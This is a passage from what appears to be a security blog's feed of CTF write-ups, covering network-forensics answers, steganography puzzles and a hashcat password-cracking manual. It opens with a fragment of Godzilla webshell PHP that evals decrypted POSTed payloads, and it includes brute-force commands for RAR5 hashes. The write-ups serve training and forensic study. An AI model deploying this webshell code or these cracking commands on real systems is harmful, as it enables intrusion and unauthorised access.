$data&#x3D;encode(base64_decode($_POST[$pass]),$key);</span><br><span class="line">    if (isset($_SESSION[$payloadName]))&#123;</span><br><span class="line">        $payload&#x3D;encode($_SESSION[$payloadName],$key);</span><br><span class="line">        eval($payload);</span><br><span class="line">        echo substr(md5($pass.$key),0,16);</span><br><span class="line">        echo base64_encode(encode(@run($data),$key));</span><br><span class="line">        echo substr(md5($pass.$key),16);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        if (stripos($data,&quot;getBasicsInfo&quot;)!&#x3D;&#x3D;false)&#123;</span><br><span class="line">            $_SESSION[$payloadName]&#x3D;encode($data,$key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在本地搭建哥斯拉木马连接并修改response</p><p><img lazyload src="/images/loading.svg" data-src="47.png" alt="47"></p><p>得到flag</p><p><img lazyload src="/images/loading.svg" data-src="48.jpg" alt="48"></p><h4><span id="ios">ios</span></h4><h5><span id="101">10.1</span></h5><p>黑客所控制的C&amp;C服务器IP是_____________。</p><p>搜索分组字节流github,找到No.17375的数据</p><p>最下面就是ip</p><p><img lazyload src="/images/loading.svg" data-src="49.png" alt="49"></p><p>答案为：3.128.156.159</p><h5><span id="102">10.2</span></h5><p>黑客利用的Github开源项目的名字是______。（如有字母请全部使用小写）</p><p>还是No.17375的数据流，追踪HTTP流就可以看到项目的Github地址，由地址可知名字是Stowaway</p><p><img lazyload src="/images/loading.svg" data-src="50.png" alt="50"></p><p>所以答案是：stowaway</p><h5><span id="103">10.3</span></h5><p>通讯加密密钥的明文是____________。</p><p>还是No.17375的数据，在ip -s后就是加密密钥</p><p><img lazyload src="/images/loading.svg" data-src="51.png" alt="51"></p><p>答案： hack4sec</p><h5><span id="104">10.4</span></h5><p>黑客通过SQL盲注拿到了一个敏感数据，内容是____________。</p><p>导入keylog.txt，过滤条件：tcp.stream eq 271 and ip.src == 192.168.1.8 and tls</p><p><img lazyload src="/images/loading.svg" data-src="52.png" alt="52"></p><p>然后根据这些数据手拼出答案</p><p>答案：746558f3-c841-456b-85d7-d6c0f2edabb2</p><h5><span id="105">10.5</span></h5><p>因为是端口爆破，需要找连续的端口，找了好久只有10-499连续，所以猜测答案是10-499</p><p><img lazyload src="/images/loading.svg" data-src="53.png" alt="53"></p><p><img lazyload src="/images/loading.svg" data-src="54.png" alt="54"></p><p>答案：10-499</p><h5><span id="107">10.7</span></h5><p>根据10.4的sql盲注，可知攻击了192.168.1.12，又根据access.log攻击者还攻击了172.28.0.2</p><p><img lazyload src="/images/loading.svg" data-src="55.png" alt="55"></p><p><img lazyload src="/images/loading.svg" data-src="56.png" alt="56"></p><p>答案：172.28.0.2#192.168.1.12</p><h5><span id="108">10.8</span></h5><p>黑客写入了一个webshell，其密码为____________。</p><p>打开access.log文件，就可以看到webshell的密码</p><p><img lazyload src="/images/loading.svg" data-src="57.png" alt="57"></p><p>答案： fxxk</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;首届陇剑杯网络安全大赛-2&quot;&gt;首届“&lt;em&gt;陇剑杯&lt;/em&gt;”网络安全大赛-2&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;内存分析&quot;&gt;内存分析&lt;/span&gt;&lt;/h4&gt;
&lt;h5&gt;&lt;span id=&quot;61&quot;&gt;6.1&lt;/span&gt;&lt;/h5</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="取证" scheme="http://mklkx.github.io/tags/%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>陇剑杯-1</title>
    <link href="http://mklkx.github.io/2021/09/14/%E9%99%87%E5%89%91%E6%9D%AF-1/"/>
    <id>http://mklkx.github.io/2021/09/14/%E9%99%87%E5%89%91%E6%9D%AF-1/</id>
    <published>2021-09-14T02:44:51.000Z</published>
    <updated>2021-10-12T03:30:49.130Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="首届陇剑杯网络安全大赛-1">首届“<em>陇剑杯</em>”网络安全大赛-1</span></h3><hr><h4><span id="签到">签到</span></h4><h5><span id="11">1.1</span></h5><p>拼手速，流量包里大部分是http流</p><p><img lazyload src="/images/loading.svg" data-src="1.png" alt="1"></p><p>答案:http</p><h4><span id="jwt">jwt</span></h4><h5><span id="21">2.1</span></h5><p>该网站使用了______认证方式。（如有字母请全部使用小写）</p><p>题目类型就叫jwt，所以盲猜一波jwt</p><p>答案：jwt</p><h5><span id="22">2.2</span></h5><p>黑客绕过验证使用的jwt中，id和username是______。（中间使用#号隔开，例如1#admin）</p><p>随便追踪一个POST /exec 的流，将token中间base64解码，就得到了id和username</p><p><img lazyload src="/images/loading.svg" data-src="2.png" alt="2"></p><p><img lazyload src="/images/loading.svg" data-src="3.png" alt="3"></p><p>答案：10087#admin</p><h5><span id="23">2.3</span></h5><p>黑客获取webshell之后，权限是______？</p><p>在NO.97文件流中，可以看到执行了whoami命令，得知权限为root</p><p><img lazyload src="/images/loading.svg" data-src="4.png" alt="4"></p><p>答案： root</p><h5><span id="24">2.4</span></h5><p>黑客上传的恶意文件文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)</p><p>在NO.103中，可知文件名是1.c</p><p><img lazyload src="/images/loading.svg" data-src="5.png" alt="5"></p><p>答案： 1.c</p><h5><span id="25">2.5</span></h5><p>黑客在服务器上编译的恶意so文件，文件名是_____________。(请提交带有文件后缀的文件名，<a class="link" href="http://xn--x-kb7av23a.so">例如x.so<i class="fas fa-external-link-alt"></i></a>)</p><p>已知恶意文件为.so文件，在POST /exec <a class="link" href="http://xn--looter-9v7io3x9jruq6b54e2ow0mi.so">的流中多次出现looter.so<i class="fas fa-external-link-alt"></i></a> ，<a class="link" href="http://xn--looter-2x8iqex39nzib14fpwfdzhirc458bxiv53o.so">所以直接猜测恶意文件是looter.so<i class="fas fa-external-link-alt"></i></a></p><p><img lazyload src="/images/loading.svg" data-src="6.png" alt="6"></p><p>答案： <a class="link" href="http://looter.so">looter.so<i class="fas fa-external-link-alt"></i></a></p><h5><span id="26">2.6</span></h5><p>黑客在服务器上修改了一个配置文件，文件的绝对路径为_____________。（请确认绝对路径后再提交）</p><p>在NO.129位置的数据流中存在修改配置文件的命令</p><p><img lazyload src="/images/loading.svg" data-src="7.png" alt="7"></p><p>答案：/etc/pam.d/common-auth</p><h4><span id="webshell">webshell</span></h4><h5><span id="31">3.1</span></h5><p>黑客登录系统使用的密码是_____________。</p><p>过滤条件：http，因为是登录，所以直接搜login</p><p><img lazyload src="/images/loading.svg" data-src="8.png" alt="8"></p><p><img lazyload src="/images/loading.svg" data-src="9.png" alt="9"></p><p>url解码后得到密码</p><p>答案是：Admin123!@#</p><h5><span id="32">3.2</span></h5><p>黑客修改了一个日志文件，文件的绝对路径为_____________。（请确认绝对路径后再提交）</p><p>在NO.345中，解码最后的一段L3Zhci93d3cvaHRtbC8%3D得到网站根目录路径/var/www/html</p><p><img lazyload src="/images/loading.svg" data-src="10.png" alt="10"></p><p>在Time为 251.837224 的数据流中，找到log文件data/Runtime/Logs/Home/21_08_07.log</p><p><img lazyload src="/images/loading.svg" data-src="11.png" alt="11"></p><p>拼接路径 /var/www/html/data/Runtime/Logs/Home/21_08_07.log</p><h5><span id="33">3.3</span></h5><p>黑客获取webshell之后，权限是______？</p><p>在NO.317的数据流中，执行了whoami命令，可以得知权限为www-data</p><p><img lazyload src="/images/loading.svg" data-src="12.png" alt="12"></p><p>答案：www-data</p><h5><span id="34">3.4</span></h5><p>黑客写入的webshell文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)</p><p>用Wireshark分析数据，可以找到大量的 1.php数据，根据做题的经验和追踪流的情况，确定1.php就是写入的webshell文件</p><p><img lazyload src="/images/loading.svg" data-src="13.png" alt="13"></p><p>答案：1.php</p><h5><span id="35">3.5</span></h5><p>黑客上传的代理工具客户端名字是_____________。（如有字母请全部使用小写）</p><p>过滤条件：http，时间排序倒序第一条，NO.1671的数据流</p><p><img lazyload src="/images/loading.svg" data-src="14.png" alt="14"></p><p>答案是：frpc</p><h5><span id="36">3.6</span></h5><p>黑客代理工具的回连服务端IP是_____________。</p><p>一个一个翻到NO.343的数据流，将最下面的内容用hackbar Hex解码</p><p><img lazyload src="/images/loading.svg" data-src="15.png" alt="15"></p><p><img lazyload src="/images/loading.svg" data-src="16.png" alt="16"></p><p>答案是：192.168.239.123</p><h5><span id="37">3.7</span></h5><p>黑客的socks5的连接账号、密码是______。（中间使用#号隔开，例如admin#passwd）</p><p>还是NO.343那条数据流，ip下面就是账号和密码</p><p><img lazyload src="/images/loading.svg" data-src="17.png" alt="17"></p><p>答案是：0HDFt16cLQJ#JTN276Gp</p><h4><span id="日志分析">日志分析</span></h4><h5><span id="41">4.1</span></h5><p>网络存在源码泄漏，源码文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)</p><p>搜索状态码为200的日志，发现<a class="link" href="http://www.zip.">www.zip<i class="fas fa-external-link-alt"></i></a>，提交。</p><p><img lazyload src="/images/loading.svg" data-src="18.png" alt="18"></p><p>答案:www.zip</p><h5><span id="42">4.2</span></h5><p>同样搜索200的日志，发现。</p><p><img lazyload src="/images/loading.svg" data-src="19.png" alt="19"></p><p>答案:sess_car</p><h5><span id="43">4.3</span></h5><p>同样看200的日志，发现利用了SqlFileObject类</p><p><img lazyload src="/images/loading.svg" data-src="20.png" alt="20"></p><p>答案：SqlFileObject</p><h4><span id="流量分析">流量分析</span></h4><h5><span id="51">5.1</span></h5><p>流量分析中并没有什么思路，于是想着从攻击流量的特征入手，经过wireshark的分析。大多流量的分布如下图所示。</p><p><img lazyload src="/images/loading.svg" data-src="21.png" alt="21"></p><p><img lazyload src="/images/loading.svg" data-src="22.png" alt="22"></p><p><img lazyload src="/images/loading.svg" data-src="23.png" alt="23"></p><p><img lazyload src="/images/loading.svg" data-src="24.png" alt="24"></p><p><img lazyload src="/images/loading.svg" data-src="25.png" alt="25"></p><p>但是唯有85号追踪流的分布与其他的完全不同，且比较均匀。攻击ip只有一个，于是猜测流量分布应该也与其他混淆流量不同，提交过后发现正确。</p><p><img lazyload src="/images/loading.svg" data-src="26.png" alt="26"></p><p><img lazyload src="/images/loading.svg" data-src="27.png" alt="27"></p><p>答案:172.18.0.125</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;首届陇剑杯网络安全大赛-1&quot;&gt;首届“&lt;em&gt;陇剑杯&lt;/em&gt;”网络安全大赛-1&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;签到&quot;&gt;签到&lt;/span&gt;&lt;/h4&gt;
&lt;h5&gt;&lt;span id=&quot;11&quot;&gt;1.1&lt;/span&gt;&lt;/h5&gt;
&lt;p</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="取证" scheme="http://mklkx.github.io/tags/%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>2021工业信息安全技能大赛-1</title>
    <link href="http://mklkx.github.io/2021/08/20/2021%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-1/"/>
    <id>http://mklkx.github.io/2021/08/20/2021%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-1/</id>
    <published>2021-08-20T08:24:35.000Z</published>
    <updated>2021-08-20T09:34:57.366Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="2021工业信息安全技能大赛-1">2021工业信息安全技能大赛-1</span></h3><hr><h4><span id="隐藏的工程">隐藏的工程</span></h4><blockquote><p>老代凭借多年工业企业运维经验，发现ICS工程师的工作电脑中有一张可疑的工艺图。在对图片进行分析时，发现其中存在异常信息，您能从中找到flag吗？flag格式为:flag{}</p></blockquote><p>对图片进行F5操作，</p><p>根据提示，猜测密码为ICS</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java Extract gcwj.jpg  -e 1.txt -p ICS</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="1.png" alt="1"></p><p>得到1.txt</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;wwr.lanzoui.com&#x2F;iIMaiqcpaxg</span><br></pre></td></tr></table></figure><p>一个蓝奏云链接</p><p>通过提取得到工程文件</p><p>发现名为【汽机系统】的工程文件中存在kingview6.55的关键词</p><p><img lazyload src="/images/loading.svg" data-src="3.png" alt="3"></p><p>通过查阅，能看到这是组态王6.55的相关文件</p><p><img lazyload src="/images/loading.svg" data-src="2.png" alt="2"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;2021工业信息安全技能大赛-1&quot;&gt;2021工业信息安全技能大赛-1&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;隐藏的工程&quot;&gt;隐藏的工程&lt;/span&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;老代凭借多年工业企业运维经验，发现IC</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>hashcat使用手册</title>
    <link href="http://mklkx.github.io/2021/06/25/hashcat%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/"/>
    <id>http://mklkx.github.io/2021/06/25/hashcat%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/</id>
    <published>2021-06-25T08:57:41.000Z</published>
    <updated>2021-06-28T07:41:50.745Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="hashcat使用手册">hashcat使用手册</span></h3><hr><h4><span id="写在前面">写在前面</span></h4><p>遇到一道【羊城杯】的题，在解的过程中遇到rar5</p><p>发现手头所有的工具都无法爆破，想起【Nep2021】的【make_hsy_great_again】</p><p>但由于此次为掩码爆破，故而有了这篇文章，详细谈谈hashcat的使用，作为个人的学习留存。</p><h4><span id="rar2john">rar2john</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># rar2john 65.rar </span><br><span class="line">Created directory: &#x2F;root&#x2F;.john</span><br><span class="line">65.rar:$rar5$16$a2dce3925af59efb2df9851dbfc24fb1$15$bb005ea8f91bf0356c8dddcfa41ac4cb$8$62293dc5e26e9e7f</span><br></pre></td></tr></table></figure><h4><span id="hashcat-advanced-password-recovery">hashcat - advanced password recovery</span></h4><p>hashcat的基本用法为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat [options]... hash|hashfile|hccapxfile [dictionary|mask|directory]...</span><br></pre></td></tr></table></figure><p>一条常见的爆破命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat --force -m 13000 -a 3 &#39;$rar5$16$fe5656ec27f0754cb92ca0a79120e099$15$974a98d46f1d4da877c271091ea930e9$8$48f568d6888772c2&#39; ?d?d?d?d?d?d</span><br></pre></td></tr></table></figure><p>一条掩码爆破命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat --force -m 13000 -a 3 &#39;$rar5$16$a2dce3925af59efb2df9851dbfc24fb1$15$bb005ea8f91bf0356c8dddcfa41ac4cb$8$62293dc5e26e9e7f&#39; GW?a?a?a?a</span><br></pre></td></tr></table></figure><p>通过查询形成总结</p><h4><span id="-m攻击的哈希类型">-m#攻击的哈希类型</span></h4><p>md5系列</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   0 | MD5                                              | Raw Hash</span><br><span class="line">  10 | md5($pass.$salt)                                 | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">  20 | md5($salt.$pass)                                 | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">  30 | md5(utf16le($pass).$salt)                        | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">  40 | md5($salt.utf16le($pass))                        | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">3800 | md5($salt.$pass.$salt)                           | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">3710 | md5($salt.md5($pass))                            | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">4010 | md5($salt.md5($salt.$pass))                      | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">4110 | md5($salt.md5($pass.$salt))                      | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">2600 | md5(md5($pass))                                  | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">3910 | md5(md5($pass).md5($salt))                       | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">4300 | md5(strtoupper(md5($pass)))                      | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">4400 | md5(sha1($pass))                                 | Raw Hash, Salted and&#x2F;or Iterated</span><br></pre></td></tr></table></figure><p>sha256系列</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1410 | sha256($pass.$salt)                              | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">1420 | sha256($salt.$pass)                              | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">1430 | sha256(utf16le($pass).$salt)                     | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">1440 | sha256($salt.utf16le($pass))                     | Raw Hash, Salted and&#x2F;or Iterated</span><br></pre></td></tr></table></figure><p>DES,3DES</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">14000 | DES (PT &#x3D; $salt, key &#x3D; $pass)                    | Raw Cipher, Known-Plaintext attack</span><br><span class="line">14100 | 3DES (PT &#x3D; $salt, key &#x3D; $pass)                   | Raw Cipher, Known-Plaintext attack</span><br></pre></td></tr></table></figure><p>CRC32校验</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">11500 | CRC32                                            | Checksums</span><br></pre></td></tr></table></figure><p>7z,rar5,zip</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">11600 | 7-Zip                                            | Archives</span><br><span class="line">12500 | RAR3-hp                                          | Archives</span><br><span class="line">13000 | RAR5                                             | Archives</span><br><span class="line">13600 | WinZip                                           | Archives</span><br></pre></td></tr></table></figure><p>TrueCrypt,VeraCrypt</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 62XY | TrueCrypt                                        | Full-Disk Encryption (FDE)</span><br><span class="line">137XY | VeraCrypt                                        | Full-Disk Encryption (FDE)</span><br></pre></td></tr></table></figure><p>pdf系列</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10400 | PDF 1.1 - 1.3 (Acrobat 2 - 4)                    | Documents</span><br><span class="line">10410 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1       | Documents</span><br><span class="line">10420 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2       | Documents</span><br><span class="line">10500 | PDF 1.4 - 1.6 (Acrobat 5 - 8)                    | Documents</span><br><span class="line">10600 | PDF 1.7 Level 3 (Acrobat 9)                      | Documents</span><br><span class="line">10700 | PDF 1.7 Level 8 (Acrobat 10 - 11)                | Documents</span><br></pre></td></tr></table></figure><p>text</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">99999 | Plaintext                                        | Plaintext</span><br></pre></td></tr></table></figure><h4><span id="-a攻击模式">-a#攻击模式</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- [ Attack Modes ] -</span><br><span class="line"></span><br><span class="line">  # | Mode</span><br><span class="line"> &#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">  0 | Straight# 字典破解</span><br><span class="line">  1 | Combination# 组合破解</span><br><span class="line">  3 | Brute-force# 掩码暴力破解</span><br><span class="line">  6 | Hybrid Wordlist + Mask # 混合字典+掩码</span><br><span class="line">  7 | Hybrid Mask + Wordlist # 混合掩码+字典</span><br></pre></td></tr></table></figure><h4><span id="攻击模式">?#攻击模式</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- [ Built-in Charsets ] -</span><br><span class="line"></span><br><span class="line">  ? | Charset</span><br><span class="line"> &#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">  l | abcdefghijklmnopqrstuvwxyz</span><br><span class="line">  u | ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line">  d | 0123456789</span><br><span class="line">  h | 0123456789abcdef</span><br><span class="line">  H | 0123456789ABCDEF</span><br><span class="line">  s |  !&quot;#$%&amp;&#39;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\]^_&#96;&#123;|&#125;~</span><br><span class="line">  a | ?l?u?d?s</span><br><span class="line">  b | 0x00 - 0xff</span><br></pre></td></tr></table></figure><p>​</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;hashcat使用手册&quot;&gt;hashcat使用手册&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;写在前面&quot;&gt;写在前面&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;遇到一道【羊城杯】的题，在解的过程中遇到rar5&lt;/p&gt;
&lt;p&gt;发现手头所有的工具都无法</summary>
      
    
    
    
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>2021DozerCTF</title>
    <link href="http://mklkx.github.io/2021/06/06/2021DozerCTF/"/>
    <id>http://mklkx.github.io/2021/06/06/2021DozerCTF/</id>
    <published>2021-06-06T13:25:34.000Z</published>
    <updated>2021-06-06T13:37:47.182Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="2021dozerctf">2021DozerCTF</span></h3><hr><h4><span id="不会有人以为re那道才是签到吧">不会有人以为re那道才是签到吧</span></h4><p>bilibili视频0.5倍速截图</p><p><img lazyload src="/images/loading.svg" data-src="1.png" alt="1"></p><h4><span id="detective_novel">detective_novel</span></h4><p>output后得到zip</p><p>zip里有flag.jpg和hint.png</p><p>hint.png丢进010editor</p><p>手动分离</p><p><img lazyload src="/images/loading.svg" data-src="2.png" alt="2"></p><p>用winrar打开</p><p>得到hint.txt【希尔顿给福尔摩斯的一封信！！！】</p><p>和letter.png</p><p>跳舞的小人易得到【DOZER】</p><p>结合hint.png中关键词【guess】</p><p>猜测为outguess加密</p><p><img lazyload src="/images/loading.svg" data-src="3.png" alt="3"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DozerCTF&#123;Y0u_arE_h0lME4&#125;</span><br></pre></td></tr></table></figure><h4><span id="一点也不杂">一点也不杂</span></h4><p>第一部分</p><p><img lazyload src="/images/loading.svg" data-src="4.png" alt="4"></p><p><img lazyload src="/images/loading.svg" data-src="5.png" alt="5"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DOYOUKNOW_CRT</span><br></pre></td></tr></table></figure><p>第二部分</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">from functools import reduce</span><br><span class="line">def egcd(a, b):</span><br><span class="line">    &quot;&quot;&quot;扩展欧几里得&quot;&quot;&quot;</span><br><span class="line">    if 0 &#x3D;&#x3D; b:</span><br><span class="line">        return 1, 0, a</span><br><span class="line">    x, y, q &#x3D; egcd(b, a % b)</span><br><span class="line">    x, y &#x3D; y, (x - a &#x2F;&#x2F; b * y)</span><br><span class="line">    return x, y, q</span><br><span class="line">def chinese_remainder(pairs):</span><br><span class="line">    &quot;&quot;&quot;中国剩余定理&quot;&quot;&quot;</span><br><span class="line">    mod_list, remainder_list &#x3D; [p[0] for p in pairs], [p[1] for p in pairs]</span><br><span class="line">    mod_product &#x3D; reduce(lambda x, y: x * y, mod_list)</span><br><span class="line">    mi_list &#x3D; [mod_product&#x2F;&#x2F;x for x in mod_list]</span><br><span class="line">    mi_inverse &#x3D; [egcd(mi_list[i], mod_list[i])[0] for i in range(len(mi_list))]</span><br><span class="line">    x &#x3D; 0</span><br><span class="line">    for i in range(len(remainder_list)):</span><br><span class="line">        x +&#x3D; mi_list[i] * mi_inverse[i] * remainder_list[i]</span><br><span class="line">        x %&#x3D; mod_product</span><br><span class="line">    return x</span><br><span class="line">if __name__&#x3D;&#x3D;&#39;__main__&#39;:</span><br><span class="line">    print(chinese_remainder([(5,2) ,(7,2)  ,(17,9) ,(23,16)]))</span><br><span class="line"></span><br><span class="line">#5007</span><br></pre></td></tr></table></figure><p>第三部分</p><p>base85解密</p><p><img lazyload src="/images/loading.svg" data-src="6.png" alt="6"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_good_over&#125;</span><br></pre></td></tr></table></figure><p>拼接得flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DozerCTF&#123;DOYOUKNOW_CRT5007_good_over&#125;</span><br></pre></td></tr></table></figure><h4><span id="funny_pixel">funny_pixel</span></h4><p>图片放大发现中心部分存在01字样</p><p><img lazyload src="/images/loading.svg" data-src="7.png" alt="7"></p><p><img lazyload src="/images/loading.svg" data-src="8.png" alt="8"></p><p>利用PS提取RGB</p><p><img lazyload src="/images/loading.svg" data-src="9.png" alt="9"></p><p>根据国赛的脚本修改</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from PIL import Image</span><br><span class="line">text&#x3D;[]</span><br><span class="line">for num in range(1,219):</span><br><span class="line">    for k in range(num,num+1):#张数一共218(1,2)(2,3)(218,219)</span><br><span class="line">        print(k)</span><br><span class="line">        im &#x3D; Image.open(&#39;%d.png&#39;%k)</span><br><span class="line">        # print(im.size[0])#310</span><br><span class="line">        # print(im.size[1])#280</span><br><span class="line">        for i in range(im.size[0]):</span><br><span class="line">            for j in range(im.size[1]):</span><br><span class="line">                if(im.getpixel((i, j))&#x3D;&#x3D;(239,239,39)):</span><br><span class="line">                    string&#x3D;str(i)+&quot;#&quot;+str(j)</span><br><span class="line">                    text.append(string)</span><br><span class="line">                    #print(im.getpixel((i,j)))</span><br><span class="line">        # img&#x3D;Image.new(&#39;RGB&#39;,(310,280))</span><br><span class="line">        # text &#x3D; file.readline()</span><br><span class="line">        #print(text)</span><br><span class="line">        ch &#x3D; []</span><br><span class="line">        x &#x3D; []</span><br><span class="line">        y &#x3D; []</span><br><span class="line">        for i in range(len(text)):</span><br><span class="line">            ch.append(str(text[i]).split(&quot;#&quot;))</span><br><span class="line">            #print(ch)</span><br><span class="line">            x &#x3D; []</span><br><span class="line">            y &#x3D; []</span><br><span class="line">            for i in ch:</span><br><span class="line">                x.append(i[0])</span><br><span class="line">                y.append(i[1])</span><br><span class="line">        print(x)</span><br><span class="line">        print(y)</span><br><span class="line">        # print(x)</span><br><span class="line">        # print(y)</span><br><span class="line">        # img &#x3D; Image.new(&#39;RGB&#39;, (310, 280))</span><br><span class="line">        # for j in range(len(x)):</span><br><span class="line">        #     print(int(x[j]),int(y[j]))</span><br><span class="line">        #     img.putpixel((int(x[j]), int(y[j])), (239, 239, 39))</span><br><span class="line">        #     img.save(&quot;test%d.png&quot; % k)</span><br></pre></td></tr></table></figure><p>考虑到如果输出图片，仍然需要肉眼识别01，</p><p>不如寻找其中的规律</p><p>观察发现</p><p><img lazyload src="/images/loading.svg" data-src="10.png" alt="10"></p><p>针对0和1，识别的内容如上图</p><p>利用notepad++进行进一步的数据操作</p><p><img lazyload src="/images/loading.svg" data-src="11.png" alt="11"></p><p><img lazyload src="/images/loading.svg" data-src="12.png" alt="12"></p><p>同时对逗号进行进一步微调后，得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">01000100011011110111101001100101011100100100001101010100010001100111101101000100001100000101111101111001010011110101010101011111010011000100100101101011011001010101111101010000011010010111100001000101011011000111110111</span><br></pre></td></tr></table></figure><p>在线进制转换</p><p><a class="link" href="http://www.ab126.com/goju/1711.html">http://www.ab126.com/goju/1711.html<i class="fas fa-external-link-alt"></i></a></p><p><img lazyload src="/images/loading.svg" data-src="13.png" alt="13"></p><p><strong>DozerCTF{D0_yOU_LIke_PixEl}</strong></p><h4><span id="做个问卷吧">做个问卷吧</span></h4><p><strong>DozerCTF{Thank_you_for_participating_in_DozerCTF2021}</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;2021dozerctf&quot;&gt;2021DozerCTF&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;不会有人以为re那道才是签到吧&quot;&gt;不会有人以为re那道才是签到吧&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;bilibili视频0.5倍速截图&lt;/p</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>美团CTF初+决</title>
    <link href="http://mklkx.github.io/2021/06/06/%E7%BE%8E%E5%9B%A2CTF%E5%88%9D-%E5%86%B3/"/>
    <id>http://mklkx.github.io/2021/06/06/%E7%BE%8E%E5%9B%A2CTF%E5%88%9D-%E5%86%B3/</id>
    <published>2021-06-06T12:48:00.000Z</published>
    <updated>2021-06-06T13:01:51.084Z</updated>
    
